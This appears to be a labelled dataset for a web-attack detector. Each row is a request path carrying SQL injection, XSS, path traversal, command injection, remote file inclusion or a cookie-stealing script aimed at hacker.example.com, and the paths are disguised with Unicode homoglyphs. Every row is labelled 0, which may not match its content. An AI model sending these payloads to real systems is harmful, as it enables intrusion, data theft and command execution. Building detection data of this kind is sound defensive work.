sentences 	 labels
/ 𝐬𝚝ring / strings / parameters = 1 %  '  )  or 7417 =  ( select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 )  --  	 0
/ 𝓼𝚝ring / str =  $  ( echo jtzcsg )   str1 =  $  {  # str }   if  [  9 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  \  \  	 0
/ 𝟶z𝟧75z74 . x ?  < script > document . cookie =  " testuhsv = 9753 ;  "  <  / script >  	 0
/ 𝒆𝐱amples / jsp / jsp2 / el / index . php ? gadget = glossary & action = view & term =  < script > alert (  ' jaws_xss . nasl '  )  ;  <  / script >  	 0
/ o𝗐𝒔-bin / dcforum . cgi ? az = list & forum =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  	 0
/ 𝔢n-𝙪s / account / index . php ? album =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  	 0
/ 𝖘𝘁ring / strings / parameters = 1 "  "  )  )  as yfpl where 4820 = 4820 union all select null , null , null , null , null , null , null --  	 0
/ 𝘴𝐭ring / strings / parameters = < script / src =  " data :  & comma ; eval ( atob ( location . hash . slice ( 1 )  )  )  /  /  # alert ( 1 )  	 0
/ ѕ𝓽ring / modo = registro & login = jessamin & password = entera & nombre = miyn & apellidos = agundis + depalol & email = bonner @ 926 . dm & dni = 22787443d & direccion = probintzietako ,  + 3 + 10 ? d & ciudad = sils & cp = 47686 +  & provincia = girona & ntc = 7246879991228757 & b1 = registrar  	 0
/ 𝑠𝗍ring / strings / parameters = 1 '  rlike sleep ( 5 )  and  ' cugs '  =  ' cugs  	 0
/ 𝖘𝒕ring / strings / parameters = -6249 '  )  )  )  union all select 5136 , 5136 , 5136 , 5136 , 5136 , 5136 , 5136 , 5136 , 5136 --  	 0
/ 𝓮n-𝙪s / static / app / gettingstarted /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  / etc / passwd  	 0
/ 𝘴𝑡ring / strings / parameters = 1 "  "  or 9643 =  ( select count (  *  )  from domain . domains as t1 , domain . columns as t2 , domain . tables as t3 )  and  "  " vwep "  "  like  "  " vwep  	 0
/ 𝘢z𝔠rfs8d . cfm ?  < script > document . cookie =  " testjpdr = 9205 ;  "  <  / script >  	 0
/ 𑣁𝐭ring / strings / parameters = 1 '  )  )  )  and 6414 =  ( select count (  *  )  from rdb $ fields as t1 , rdb $ types as t2 , rdb $ collations as t3 , rdb $ functions as t4 )  and  (  (  (  ' hryb '  =  ' hryb  	 0
/ 𝚙𝙝pmyadmin /  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 0
/ ƽ𝘵ring / strings / parameters = "  `  '  >  < script >  \ xc2 \ xa0javascript : alert ( 1 )  <  / script >  	 0
/ 𑣁𝘵reamline-1 . 0-beta4 / src / core / theme / includes / account_footer . php ? sl_theme_unix_path = xxpathxx ?  	 0
/ 𝒔𝖈ripts / image . php ? src = system / config / localconfig . php  	 0
/ 𝒔𝔱ring / strings / parameters = 1 '  where 3125 = 3125  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 )  , 0 )  , 500000000 )  , null )  else char ( 108 )  |  | char ( 76 )  |  | char ( 112 )  |  | char ( 116 )  end )  from information_schema . system_users )  --  	 0
/ 𝙨𝚝ring / strings / parameters = 1 '  )  )  )  ; select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 --  	 0
/ 𝓼𝖙ring / strings / parameters = &  sleep 0  &  &  str =  $  ( echo cjcsgg )   &  &  str1 =  $  {  # str }   &  &   [  6 -eq  $  { str1 }   ]   &  &  sleep 1  &  	 0
/ m𝗉𝖼gi / fileseek . cgi ? foot =  & head =  ; cat  / etc / passwd |  	 0
/ 𝙨𝘵ring / strings / parameters = -1998 '  )  as kgvf where 2346 = 2346 union all select 2346 , 2346 , 2346 , 2346 , 2346 , 2346 , 2346 , 2346 , 2346 --  	 0
/ 𝚜𝖙ring / strings / parameters = |   [  3 -ne  $  ( echo pgfhfd  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  /  /  	 0
/ 𝗯𝟰vng02k . cfm ?  < meta http-equiv = set-cookie content =  " testtrlh = 3672 "  >  	 0
/ o𝟣zj𝟦u9v . jspa ?  < meta http-equiv = set-cookie content =  " testabrn = 6368 "  >  	 0
/ 𝚛𝗯ec2ohx . dll ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ 𝔰𝔱ring / strings / parameters = 1 "  "  )  )  as rign where 1604 = 1604 and 3661 = 3054 --  	 0
/ 𝗴𞣋nu2yy7 . jspa ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ 𝗌𝒕ring / strings / parameters = &  sleep 0  &  &  str =  $  ( echo zyxrff )   &  &  str1 =  $  {  # str }   &  &   [  4 -eq  $  { str1 }   ]   &  &  sleep 1  &  	 0
/ 𝚐𝟑w7y7u5 . cgi ?  < meta http-equiv = set-cookie content =  " testbfpq = 3326 "  >  	 0
/ ѕ𝔱ring / strings / parameters = 1 '  and 1541 = 6868 #  	 0
/ 𝘩𝘁8pn8uq . php3 ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ 𝑠𝗍ring / strings / parameters = 1 '  |  |  ( select  ' exls '  where 3837 = 3837 and sleep ( 5 )  )  |  |  '  	 0
/ jаνascript / children . exe  	 0
/ 𝒽𝚎lp . php ? q =  "  & del \ x09q98836719 & rem \ x09  	 0
/ 𝔰𝖆 ' di_muslih-uddin /  	 0
/  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  . do  	 0
/ 𝖊𝖝amples / jsp / error / protection . php ? action = logout & siteurl =  / etc / passwd  	 0
/ 𝚜𝕥ring / modo = entrar & login = nelon & pwd = equin57ermo & remember = off /  & b1 = entrar  	 0
/ ꜱ𝘁ring / strings / parameters = [  [  #  < script > alert ( 1 )  <  / script >  |  	 0
/ o𝖕𝔢nsiteadmin / scripts / classes / filter . php ? path = http :  /  / 192 . 168 . 202 . 96 : 8080 / frznctvhi0i5 ?  \ x00  	 0
/ 𝓼𝘁ring / strings / parameters = <  < script > document . cookie = true ;  <  / script >  	 0
/ 𝐭o𝙥 . php ? stuff =  "  & ver \ xa0 > q97411474 & rem \ xa0  	 0
/ 𑣁𝚝ring / strings / parameters = '  |   [  7 -ne  $  ( echo suchgf  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  \  \  	 0
/ 𝑠𝔱ring / strings / parameters = < a href =  "  \ xe2 \ x80 \ x84javascript : javascript : alert ( 1 )  "  id =  " fuzzelement1 "  > test <  / a >  	 0
/ 𝘀𝐭ring / id = 3any  set-cookie :  + tamper = 5765205567234876235 & nombre = jamn + ibrico & precio = 100 & cantidad = 47 & b1 = aadir + al + carrito  	 0
/ 𑣁𝕥ring / strings / parameters = < script > document . cookie =  " testiulz = 3709 ;  "  <  / script >  	 0
/ 𝔰𝘵ring / strings / parameters = 1 '  )  )  )  and elt ( 3114 = 3114 , sleep ( 5 )  )  #  	 0
/ 𝐬𝔱ring / strings / parameters = 1 '  )  )  )  or exp (  ~  ( select  *  from  ( select concat ( 0x7171706a71 ,  ( select  ( elt ( 6270 = 6270 , 1 )  )  )  , 0x717a767a71 , 0x78 )  ) x )  )  and  (  (  (  ' fbsi '  like  ' fbsi  	 0
/ j𝙙𝐱255ea . mscgi ?  < meta http-equiv = set-cookie content =  " testziyq = 5055 "  >  	 0
/ ƽ𝘵ring / strings / parameters = 1 %  "  "  )  )  )  union all select null , null --  	 0
/ 𝕤𝗍ring / strings / parameters = 1 )  where 2044 = 2044 or elt ( 6272 = 6272 , sleep ( 5 )  )  --  	 0
/  < script > alert (  ' vulnerable '  )  <  / script >  . jsp  	 0
/ ℮𝚡amples / jsp / num / whois . cgi ? action = load & whois =  ; id  	 0
/ 𝘴𝗍ring / strings / parameters = 1 '  )  where 6092 = 6092 ; call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  --  	 0
/ 𝔰𝐭ring / strings / parameters = % o % o % o % o % o % o % o % o % o % o % o % o % o % o % o % o % o % o % o % o % o % o % o % o % o % o % o % o % o % o % o % o % o % o % o % o % o % o % o % o % o % o % o % o % o % o % o % o % o % o % o % o % o % o  	 0
/ mo𝗱𝗎les / newusergreatings / pm_newreg . php ? exbb [ home_path ]  = xxpathxx ?  	 0
/ ѕ𝓽ring / strings / parameters = -1000 "  "  or 3440 = cast (  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  )  |  |  ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end )  )  :  : text |  |  ( chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  as numeric )  and  "  " isbq "  "  =  "  " isbq  	 0
/ 𝒔𝙩ring / strings / parameters = < imgsrc =  &  # 0000106 &  # 0000097 &  < wbr >  # 0000118 &  # 0000097 &  # 0000115 &  < wbr >  # 0000099 &  # 0000114 &  # 0000105 &  < wbr >  # 0000112 &  # 0000116 &  # 0000058 &  < wbr >  # 0000097 &  # 0000108 &  # 0000101 &  < wbr >  # 0000114 &  # 0000116 &  # 0000040 &  < wbr >  # 0000039 &  # 0000088 &  # 0000083 &  < wbr >  # 0000083 &  # 0000039 &  # 0000041 >  	 0
/ 𝙨𝟟qus4g3 . exe ?  < script > cross_site_scripting . nasl <  / script >  	 0
/  ' jason scott "  podcasts /  	 0
/ mа𝒊n . php ? stuff =  '  	 0
/ ℮𝓍amples / jsp / checkbox / js / scripts . php ? load =  / etc / passwd \ x00  	 0
/ 𝘀𝑡ring / strings / parameters = 1 "  "  )  )  and extractvalue ( 7982 , concat ( 0x5c , 0x7171706a71 ,  ( select  ( elt ( 7982 = 7982 , 1 )  )  )  , 0x717a767a71 )  )  and  (  (  "  " xccy "  "  =  "  " xccy  	 0
/ 𝑓n𑜏hrxyd . cfm ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ mа𝑖n . php ? stuff =  "  & rm \ x0cq27346825 & rem \ x0c  	 0
/ 𝐬𝓽ring / id = 3 & nombre = vino + rioja & precio = 85 & cantidad = 76 '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  & b1 = aadir + al + carrito  	 0
/ 𝔭𝒽pwcms_template / inc_script / frontend_render / navigation / config_html_menu . php ? html_menu_dirpath = http :  /  / 192 . 168 . 202 . 118 : 8080 / ghl9il ?  	 0
/ 𝕡𝗵pmyadmin / inc / formmail . inc . php ? script_root =  .  .  / templates / mail . tpl . txt \ x00  	 0
/ loɡɩn . php ? procesa = si & usuario_nkads_admin =  '  or isnull ( 1 / 0 )  /  *  	 0
/ j𝘢ᴠascript / backups . exe  	 0
/ 𝕣𝒆cordings / am . pl ? path = bin / mozilla & action = display_form & file = users / etc / passwd & login = root + login  	 0
/ ƽ𝘁ring / strings / parameters = 1 )  )  ; begin user_lock . sleep ( 5 )  ;  end and  (  ( 6874 = 6874  	 0
/ 𝙮𝘣z5rz7a . kspx ?  < script > document . cookie =  " testsbvw = 6289 ;  "  <  / script >  	 0
/ m𝔞ⅰn . php ? logout =  " ver ,  > q74451345 & rem ,  	 0
/ 𝘀𝐭ring / strings / parameters = &  sleep 0  &  &  str =  $  ( echo ituctb )   &  &  str1 =  $  {  # str }   &  &   [  4 -eq  $  { str1 }   ]   &  &  sleep 1  	 0
/ 𝓼𝖙ring / strings / parameters = & echo $ ifsohdhig $  (  ( 24 + 5 )  )  $  ( echo $ ifsohdhig ) ohdhig  	 0
/ ꜱ𝚝ring / strings / parameters = 1 %  '  )  ; select  ( case when  ( 4666 = 4666 )  then 1 else 4666 *  ( select 4666 from master .  . sysdatabases )  end )  --  	 0
/ 𐑈𝓽ring / strings / parameters = 1 "  "  )  )  as irrz where 8730 = 8730 order by 1 #  	 0
/ ѕ𝔱ring / strings / parameters = 1 '  )  as wnyl where 8978 = 8978 or 5286 =  ( select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 )  --  	 0
/ 𝘦𝚡amples / jsp / cal / www / delivery / ac . php ? bannerid = -1331904367 + or + 1 = 1 +  --  +  '  ; passthru ( base64_decode (  $ _server [ http_nessus_gzot_utg ]  )  )  ; die ;  /  *  	 0
/ 𝚜𝚝ring / id =  ?  & nombre = jamn + ibrico & precio = 100 & cantidad = 35 & b1 = aadir + al + carrito  	 0
/ ѕ𝘤ripts / dataservice . asmx / authuser ? username =  ' nessus1331919210 & password = nasl & needcompress = 0  	 0
/ 𝒽ꬲlp . php ? q =  " ver \ x0c > q88163734 & rem \ x0c  	 0
/ 🯳mƼknyc4 . php3 ?  < meta http-equiv = set-cookie content =  " testbgqj = 6434 "  >  	 0
/ 𝙨𝗍ring / strings / parameters = "  &  sleep 0  &  &  str =  $  ( echo frmtbn )   &  &  str1 =  $  {  # str }   &  &   [  3 -eq  $  { str1 }   ]   &  &  sleep 1  '  	 0
/ 𑣁𝘁ring / strings / parameters = &  sleep 0  &  &  str =  $  ( echo lbfvns )   &  &  str1 =  $  {  # str }   &  &   [  5 -eq  $  { str1 }   ]   &  &  sleep 1  #  	 0
/ 𝚜𝖙ring / strings / parameters = 1 %  '  ; select like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  --  	 0
/ 🯶Ο6wkcop . cfm ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ 𝗀o𝘢 ' uld /  	 0
/ m𝚊ın . php ? stuff =  "  & del q89179194 & rem  	 0
/ 𝚜𝘁ring / strings / parameters = &  sleep 0  &  &  str =  $  ( echo tmpvms )   &  &  str1 =  $  {  # str }   &  &   [  2 -eq  $  { str1 }   ]   &  &  sleep 1  "  	 0
/ 𝔰𝘵ring / strings / parameters = 1 '  +  ( select  ' ayod '  where 7839 = 7839 or  ( select 2 *  ( if (  ( select  *  from  ( select concat ( 0x7171706a71 ,  ( select  ( elt ( 8113 = 8113 , 1 )  )  )  , 0x717a767a71 , 0x78 )  ) s )  ,  8446744073709551610 ,  8446744073709551610 )  )  )  )  +  '  	 0
/ 𝘴𝕥ring / strings / parameters = 1 "  "  ; select  ( case when  ( 8618 = 8706 )  then 8618 else 8618 *  ( select 8618 from mysql . db )  end )  #  	 0
/ 𝐞𝓍amples / jsp / cal / file . php ? path =  / etc / passwd \ x00  	 0
/ 𝓈𝕥ring / strings / parameters = 1 '  and 2388 = benchmark ( 5000000 , md5 ( 0x6d457153 )  )  #  	 0
/  .  .  .  .  /  /  .  .  .  .  /  / web-inf / web . xml  	 0
/ 𝘀𝖙ring / strings / parameters = 1 "  "  )  where 9062 = 9062 ; select  ( case when  ( 8916 = 1357 )  then 8916 else 8916 *  ( select 8916 from information_schema . character_sets )  end )  #  	 0
/ 𝗽𝙗server /  .  .  \ xc1 % 8s .  .  \ xc1 % 8s .  .  \ xc1 % 8s .  .  \ xc1 % 8s .  .  \ xc1 % 8s .  .  / winnt / system32 / cmd . exe ?  / c + dir + c :  \  +  / og  	 0
/ 𝑠𝚝ring / strings / parameters = & lt ; script a =  `  & gt ;  `  src =  \  " http &  # 58 ;  /  / ha &  # 46 ; ckers &  # 46 ; org / xss &  # 46 ; js \  "  & gt ;  & lt ;  / script & gt ;  	 0
/ ϲonſig . php ? rel_path = xxpathxx ?  	 0
/ mo𝚍𝓾les . php ? name = news & op = rate_complete & sid = 1 '  and 1 = 0 union /  *  *  /  select  ' sqlinjection_test & score = 5  	 0
/  /  .  .  \ xc1 \ x9c .  .  \ xc1 \ x9c .  .  \ xc1 \ x9c .  .  \ xc1 \ x9c .  .  \ xc1 \ x9c .  .  \ xc1 \ x9c .  .  \ xc1 \ x9c .  .  \ xc1 \ x9c / etc / passwd  	 0
/ 𝒔𝖙ring / strings / parameters = 1 '  )  where 2775 = 2775 or 2633 = dbms_pipe . receive_message ( chr ( 112 )  |  | chr ( 65 )  |  | chr ( 65 )  |  | chr ( 103 )  , 5 )  --  	 0
/ 𝑒𝓍amples / jsp / checkbox / profil . php ? id = 1  < script > foo <  / script >  	 0
/ 𝘴𝘁ring / strings / parameters = 1 )  )  )  and 8514 =  ( select count (  *  )  from domain . domains as t1 , domain . columns as t2 , domain . tables as t3 )  and  (  (  ( 8738 = 8738  	 0
/ 𝑠𝘁ring / strings / parameters = -6586 '  )  )  or 2021 = 2996  	 0
/ 𝔰𝖙ring / strings / parameters = 1 "  "  )  )  or char ( 75 )  |  | char ( 70 )  |  | char ( 99 )  |  | char ( 83 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  --  	 0
/ 𝙞n𝐝ex . php ? promod = xxpathxx ? cmd  	 0
/ 𝘀𝖙ring / strings / parameters = or  ' something '   =   ' some '  +  ' thing '  	 0
/ 𝙨𝐭ring / strings / parameters = -9937 '  )  )  union all select 3900 , 3900 , 3900 , 3900 , 3900 , 3900 , 3900 , 3900 , 3900 #  	 0
/ 𝚎ⅹamples / jsp / cal / core / editor . php ? editor_insert_bottom =  / etc / passwd  	 0
/ ꜱ𝑡ring / strings / parameters = '  echo wiruwf $  (  ( 87 + 88 )  )  $  ( echo wiruwf ) wiruwf /  /  	 0
/ 𝘴𝓽ring / strings / parameters = 1 )  or 7417 =  ( select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 )  --  	 0
/ 𝒑𝟘43snfr . htm ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ 𝔰𝔱ring / strings / parameters = 1 '  )  as tsge where 6970 = 6970 ; select count (  *  )  from generate_series ( 1 , 5000000 )  --  	 0
/ ꜱ𝓉ring / strings / parameters = "  & echo trmptd $  (  ( 48 + 23 )  )  $  ( echo trmptd ) trmptd \  	 0
/ 𐑈𝒕ring / strings / parameters = 1 '  )  )  )  ; select sleep ( 5 )  and  (  (  (  ' qjsc '  =  ' qjsc  	 0
/ ⤫𝙛kun1ku . html ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ j𝗮𝒗ascript / text . exe  	 0
/ 𝗌𝑡ring / strings / parameters = 1 %  "  "  ; if ( 8995 = 9787 )  select 8995 else drop function ofgg --  	 0
/ 𝘦𝘅amples / jsp / jsp2 / el / index . php ? search =  < script > foo <  / script >  	 0
/ m𝓪ℹn . php ? logout =  "  & rm \ x0bq41987339 & rem \ x0b  	 0
/ m𝘢ℹn . php ? logout =  "  & ver ;  > q32916572 & rem ;  	 0
/ j𝗮𝒗ascript / oa . exe  	 0
/ е×amples / jsp / sessions / pjreview_neo . cgi ? p =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 0
/ 𝘀𝓽ring / strings / parameters = | usr / bin / id  	 0
/ 𐑈𝗍ring / strings / parameters = -2351 )  )  as xdqn where 4019 = 4019 or 8571 = 8571 --  	 0
/ 𝗌𝔱ring / strings / parameters = < meta http-equiv = set-cookie content =  " testxllt = 9940 "  >  	 0
/ ᴡ℮bcgi / webcart / webcart . cgi ? change = yes & code = phold & config = mountain & nextpage =  ; cat  / etc / passwd |  	 0
/ 𑣁𝐭ring / id = 3 & nombre = sessionid = 12312312 &  + username =  < script > document . location =  ' http :  /  / hacker +  . example . com / cgi-bin / cookiesteal . cgi ?  '  +  + document . cookie <  / script >  & precio = 85 & cantidad = 32 & b1 = aadir + al + carrito  	 0
/ 𝘀𝑡ring / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo wsmvbw )   &  &  str1 =  $  {  # str }   &  &   [  8 -eq  $  { str1 }   ]   &  &  sleep 1  |  	 0
/ 𝒔𝖙ring / strings / parameters = |   [  5 -ne  $  ( echo tnsrys  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  \  \  	 0
/ 𝓈𝙩ring / strings / parameters = &  sleep 0  &  &  str =  $  ( echo qhsduy )   &  &  str1 =  $  {  # str }   &  &   [  8 -eq  $  { str1 }   ]   &  &  sleep 1  "  	 0
/ 𝖆𝓭ministrator / components / com_clickheat / install . clickheat . php ? globals [ mosconfig_absolute_path ]  = xxpathxx  	 0
/ 𝘴𝘁ring / strings / parameters = 1 "  "  )  where 2702 = 2702 and 6537 = dbms_pipe . receive_message ( chr ( 76 )  |  | chr ( 116 )  |  | chr ( 117 )  |  | chr ( 65 )  , 5 )  --  	 0
/ 𝖺o🯲2ww7y . cfm ?  < meta http-equiv = set-cookie content =  " testqppc = 8767 "  >  	 0
/ 𝕤𝒕ring / modo = registro & login = tsolas & passworda = c3763ativa . m4n3e & nombre = frida & apellidos = llagostera + llaveria & email = cockneys @ drae2 . tl & dni = 11939364h & direccion = calle + alava + 17 + 12 ? c & ciudad = sada & cp = 25139 & provincia = zaragoza & ntc = 3664449984112984 & b1 = registrar  	 0
/ 𝗌𝓽ring / strings / parameters = < iframe src = http :  /  / www . vulnerability-lab . com >  	 0
/ 𝒔𝙘ripts / fake . cgi ? arg =  / dir /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / winnt / win . ini  	 0
/ 𝐬𝖙ring / strings / parameters = ; echo $ ifscidnhm $  (  ( 30 + 88 )  )  $  ( echo $ ifscidnhm ) cidnhm  	 0
/ m𝔞ⅈn . php ? stuff =  " del ; q74579968 & rem ;  	 0
/ 𝒔𝑡ring / modo = registro & login = tsern & password = s87aboc9do4 & nombre = nadir & apellidos = ganci + zanuy & email = wolfstone @ g-audio . a @ ero & dni = 01364603j & direccion = carrer + sant + antoni ,  + s / n +  & ciudad = torre + del + bierzo & cp = 33780 & provincia = ourense & ntc = 6172384858877900 & b1 = registrar  	 0
/ 𝐡𝕖lp . php ? q =  "  \ x0drm \ x09q93881688 \ x09 #  	 0
/ 𝒑𝖍pmyadmin / nslookup . cgi ? query = localhost ; id & type = any & ns =  	 0
/ ℯ𝐱amples / jsp / colors / popup . php ? include_path =  / etc / passwd \ x00  	 0
/ j𝗮𝗏ascript / sources . exe  	 0
/  *  *  / or /  *  *  / 1 /  *  *  /  =  /  *  *  / 1  	 0
/ 𝑠𝒕ring / strings / parameters = &  sleep 0  &  &  str =  $  ( echo tpcdnb )   &  &  str1 =  $  {  # str }   &  &   [  5 -eq  $  { str1 }   ]   &  &  sleep 1  \  \  	 0
/ 𝚊𝟘imiuf1 . aspx ?  < script > document . cookie =  " testxqrn = 4654 ;  "  <  / script >  	 0
/ 𝙚𝒙amples / jsp / colors / feedsplitter . php ? format =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 & debug = 1  	 0
